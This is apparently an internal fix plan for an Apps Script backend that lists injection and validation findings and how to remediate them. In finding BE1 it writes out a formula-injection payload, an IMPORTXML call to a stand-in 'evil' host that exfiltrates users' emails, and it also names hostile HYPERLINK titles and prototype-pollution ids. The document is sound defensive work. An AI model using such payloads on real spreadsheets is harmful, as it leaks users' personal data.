# Fix plan: fix/be-input-validation-injection

**Phase:** P0 (critical) · **Ships via:** deploy skill (clasp) · **Files:** `apps-script/Code.gs`

Root theme: every write handler trusts client-supplied ids, and one writer skips the formula-injection guard the others use.

## Findings closed
- **BE1 — Formula injection via the Votes writer.** `handleVote` (~L2951) appends `[voteId, videoId, user.email, iso]` with plain `sheet.appendRow(...)` and **no** `setNumberFormat('@')`. A signed-in user posting `videoId: '=IMPORTXML("https://evil/?d="&C2,"//a")'` writes a live formula into the Votes tab whose column C is `user_email`; it executes in the operator's session on open → other users' emails exfiltrated. The comment/star/error writers all `@`-format; the vote writer is the gap.
- **BE3 — Prototype-pollution crash in `commentsBatch`.** `var byVideo = {}` (~L2687) with an `if (!byVideo[vid]) continue;` gate (~L2700). A comment row whose `video_id` is `constructor`/`toString`/`valueOf` is truthy, passes the gate, then `.push` throws — breaking the whole feed's comment-count hydration for every visitor until the row is deleted.
- **BE9 — RSS titles/URLs land unescaped.** Crawl append (~L736) writes `video.title`/`video.url` from `parseRss2`/`parseAtom` with no `@` format; a hostile feed's `=HYPERLINK(...)` title becomes a live formula, and `readAllVideos` serves back the evaluated value.
- **SEC4 — No id validation anywhere.** `handleVote`/`handleStar`/`handleAddComment` only check truthiness; no charset/length/existence check on `videoId`/`channel`. Enables junk-row flooding and the above.
- **SEC14 — `parentId` not validated.** `handleAddComment` (~L2746) sets `depth=1` for any truthy `parentId` with no check it exists on the same video; `buildCommentTree` then promotes an orphan reply onto the target video.

## Approach
1. Add `isValidId(s)` → `typeof s === 'string' && /^[A-Za-z0-9_-]{1,64}$/.test(s)` (YouTube ids are 11 chars; article ids are already alphanumeric). Apply to `videoId` in `handleVote`/`handleAddComment` and `channel` (length-cap) in `handleStar`, rejecting with the existing `{status:'error'}` shape before the lock.
2. Rewrite the vote append as the reserve-then-format pair already used by `handleStar` (~L3117) and `handleAddComment` (~L2784): `var r = sheet.getRange(rowNum,1,1,4); r.setNumberFormat('@'); r.setValues([[voteId, videoId, user.email, iso]]);`.
3. `@`-format the crawl new-row range (batched append lands in `fix/be-crawl-perf`; here just ensure single-append path formats before write).
4. `commentsBatch`: `var byVideo = Object.create(null)` (or `Object.prototype.hasOwnProperty.call` gate).
5. `handleAddComment`: when `parentId` truthy, confirm a comment with that id exists for this `videoId` before `depth=1`; else treat as top-level or reject.

## Verification
- New `tests/unit/backend/*` cases: formula-shaped `videoId` stored as text (leading `'`/`@` format), `constructor`/`toString` ids don't crash `commentsBatch`, oversized/invalid ids rejected, orphan `parentId` handled.
- `npm test`; add a case asserting the Votes range carries `@` number format.

## Sequencing
Land FIRST (data-exfil). Precedes `fix/be-abuse-rate-limits` and `fix/be-session-revocation` (all touch `Code.gs` write/auth paths).
